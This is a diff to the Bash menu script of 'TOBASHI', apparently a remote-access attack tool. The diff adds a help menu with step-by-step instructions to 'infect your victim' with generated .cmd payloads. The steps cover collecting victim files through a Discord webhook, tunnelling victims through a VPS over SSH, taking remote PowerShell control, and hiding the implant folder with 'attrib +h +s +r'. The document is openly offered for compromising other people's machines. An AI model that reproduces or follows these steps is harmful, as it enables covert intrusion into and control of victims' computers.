@@ -11,10 +11,32 @@ reset="\e[0m"
 main_menu(){
 
     clear
+
+echo "
+ ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄ 
+▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
+ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌ ▀▀▀▀█░█▀▀▀▀ 
+     ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌     ▐░▌     
+     ▐░▌     ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     
+     ▐░▌     ▐░▌       ▐░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     
+     ▐░▌     ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌     ▐░▌     
+     ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌          ▐░▌▐░▌       ▐░▌     ▐░▌     
+     ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌ ▄▄▄▄█░█▄▄▄▄ 
+     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
+      ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀ 
+                                                                                           
+    "
+
+    echo -e "${red}"
+    echo "______________________________________________________By flamendO_______________________V.1"
+    echo -e "${reset}"
+
+
     echo -e "${gras}"
 
-    echo "Welcome ! Please choose an option : "
-    echo "---------------***---------------"
+    echo "                                         Welcome ! Please choose an option : "
+    echo "                                          ---------------***---------------"
+    echo ""
     echo "[+] Commands : "
     echo "               "
     echo "      [user]...............Choose a user"
@@ -26,6 +48,7 @@ main_menu(){
     echo "      [killsession]..Kill target session"
     echo "      [reset]...........Restore settings"
     echo "      [quit]...........Leave the program"
+    echo "      [help]........................Help"
     echo "      [uninstall]......Uninstall TOBASHI" # at the end mdr
     echo -e "${reset}"
 
@@ -425,7 +448,9 @@ vps_menu(){
 
     sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'reboot'
 
-    echo "[+] Key set ! Please infect your target with src/initial_vps.cmd "
+    cp ./src/initial_vps.cmd ./payloads_generated/initial_vps.cmd
+
+    echo "[+] Key set ! Please infect your target with payloads_generated/initial_vps.cmd "
     read -p "[+] Click Enter to go back to the menu !............."
 
 }
@@ -457,6 +482,7 @@ discord_menu(){
 
     clear
     echo "Discord server has been added..."
+    cp ./src/initial_local.cmd ./payloads_generated/initial_local.cmd
     echo ""
     read -p "Click Enter to go back to the menu...." dummy
 
@@ -492,6 +518,10 @@ reset_menu(){
         cp ./bin/discord_save.txt ./discord_config/discord.txt
         cp ./bin/initial_local_save.cmd ./src/initial_local.cmd
         cp ./bin/initial_vps_save.cmd ./src/initial_vps.cmd
+
+        cp ./bin/initial_local_save.cmd ./payloads_generated/initial_local.cmd
+        cp ./bin/initial_vps_save.cmd ./payloads_generated/initial_vps.cmd
+        
         clear
         echo -e "${gras} ${red}"
         echo "[+] Options are reset !"
@@ -518,6 +548,7 @@ reset_menu(){
             cp ./bin/stage2_v_save.ps1 ./files/stage2_v.ps1
             rm ./key ./key.pub
             rm ./vps_settings/vps_conf.txt
+            cp ./bin/initial_vps_save.cmd ./payloads_generated/initial_vps.cmd
             clear
             echo -e "${gras} ${red}"
             echo "[+] Options are reset !"
@@ -558,6 +589,9 @@ reset_menu(){
             rm ./key ./key.pub
             rm ./vps_settings/vps_conf.txt
 
+            cp ./bin/initial_local_save.cmd ./payloads_generated/initial_local.cmd
+            cp ./bin/initial_vps_save.cmd ./payloads_generated/initial_vps.cmd
+
             clear
             echo -e "${gras} ${red}"
             echo "[+] Options are reset !"
@@ -589,6 +623,124 @@ reset_menu(){
 ### reset menu--------------------------------------------
 
 
+### Help Menu--------------------------------------------
+
+help_menu(){
+
+    clear
+    echo -e "${gras}"
+    echo "
+ ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄ 
+▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
+ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌ ▀▀▀▀█░█▀▀▀▀ 
+     ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌     ▐░▌     
+     ▐░▌     ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     
+     ▐░▌     ▐░▌       ▐░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     
+     ▐░▌     ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌     ▐░▌     
+     ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌          ▐░▌▐░▌       ▐░▌     ▐░▌     
+     ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌ ▄▄▄▄█░█▄▄▄▄ 
+     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
+      ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀ 
+                                                                                           
+    "
+
+    echo ""
+    echo "_______________________*~HELP MENU~*_______________________"
+    echo ""
+    echo -e "${red}"
+    echo "Please select a topic :"
+    echo -e "${reset}"
+    echo -e "${gras}"
+
+    echo "          [local].........Step to a local attack"
+    echo "          [external]..Step to an external attack"
+    echo "          [discord]..Set up your discord webhook"
+    
+    echo -e "${cyan}"
+    read -p "Option :~ " help_option
+    echo -e "${reset}"
+
+    if [ "$help_option" = "local" ]; then
+        clear
+        echo ""
+        echo "Follow Steps to configure local payload : "
+        echo ""
+        echo "[1]. Take the link of your discord webhook, copy and paste into the file /discord_config/discord.txt at the line"
+        echo "below \"DISCORD WEBHOOK\". Then go to the main menu and select the option \"discord\" and click \"Enter\" to finish"
+        echo "the configuration."
+        echo ""
+        echo "[2]. You can take the payload in /payload_generated/initial_local.cmd and infect your victim with it."
+        echo ""
+        echo "[3]. A discord user configuration file will automatically be send to your discord server in the tobashi console,"
+        echo "Copy this file and paste it in /users/local/."
+        echo ""
+        echo "[4]. Go to the main menu of tobashi, and select the option \"user\" to select the user that you want to remote."
+        echo "Note that you can select here if you want to do a local or external (vps) attack."
+        echo ""
+        echo "[5]. Now you can remote the target machine by select the option \"console\" in the main menu of tobashi."
+        echo ""
+        echo "[6]. ADVICE : command : powershell to go on a remote powershell. You can also hide the user file in C:\\Users\\ by execute"
+        echo "attrib +h +s +r C:\\Users\\[name_of_file_user]".
+        echo ""
+        echo "[7]. When you are finished, just enter this command : \"exit\" (two times if you are in the powershell of the target)."
+
+        read -p "Click Enter to go back to the menu...." dummy
+
+    elif [ "$help_option" = "external" ]; then
+        clear
+        echo ""
+        echo "Follow Steps to configure external (vps) payload :"
+        echo ""
+        echo "[1]. Take the link of your discord webhook, copy and paste into the file /discord_config/discord.txt at the line"
+        echo "below \"DISCORD WEBHOOK\". Then go to the main menu and select the option \"discord\" and click \"Enter\" to finish"
+        echo "the configuration."
+        echo ""
+        echo "[2]. Configure your VPS by select the option \"vps\" in the main menu and add your username, vps ip adress, vps password"
+        echo "This will set your VPS to create automatically a ssh tunnelling between victims and your machine. The VPS will automatically"
+        echo "restart, in order to prevent from classic errors."
+        echo ""
+        echo "[3]. You can take the payload in /payload_generated/initial_vps.cmd and infect your victim with it."
+        echo ""
+        echo "[4]. A discord user configuration file will automatically be send to your discord server in the tobashi console,"
+        echo "Copy this file and paste it in /users/vps/."
+        echo ""
+        echo "[5]. Go to the main menu of tobashi, and select the option \"user\" to select the user that you want to remote."
+        echo "Note that you can select here if you want to do a local or external (vps) attack."
+        echo ""
+        echo "[6]. Now you can remote the target machine by select the option \"console\" in the main menu of tobashi."
+        echo ""
+        echo "[7]. ADVICE : command : powershell to go on a remote powershell. You can also hide the user file in C:\\Users\\ by execute"
+        echo "attrib +h +s +r C:\\Users\\[name_of_file_user]".
+        echo ""
+        echo "[8]. When you are finished, just enter this command : \"exit\" (two times if you are in the powershell of the target)."
+        read -p "Click Enter to go back to the menu...." dummy
+
+    elif [ "$help_option" = "discord" ]; then
+        clear
+        echo "Follow Steps to configure your discord webhook : "
+        echo ""
+        echo "[1]. Go to discord, in the bottom left side, you have a \"New\" button, click here and create"
+        echo "your discord server. Create a new channel with the name that you want."
+        echo ""
+        echo "[2]. To set up a new discord webhook and linked to the channel, go to your server settings,"
+        echo "click to \"Integration\" in the section called \"Application\". Then go to \"Webhook\", and "
+        echo "create a new discord webhook."
+        echo ""
+        echo "[3]. ATTENTION : The name of the discord webhook MUST BE \"tobashiconsole\". Select the channel"
+        echo "that you've create before." 
+        echo ""
+        echo "[4]. Your discord webhook is now set !"
+        echo ""
+        read -p "[+] Click Enter to back to the menu........." dummy
+    else
+        echo "[+] Invalid Option !...... "
+        echo ""
+        read -p "[+] Click Enter to back to the menu........." dummy
+
+    fi
+}
+
+### Help Menu--------------------------------------------
 
 
 
@@ -656,6 +808,11 @@ do
         echo "GoodBye !"
         echo -e "${reset}"
         exit 0
+        ;;
+
+    help)
+
+        help_menu
         ;;
     
     uninstall)
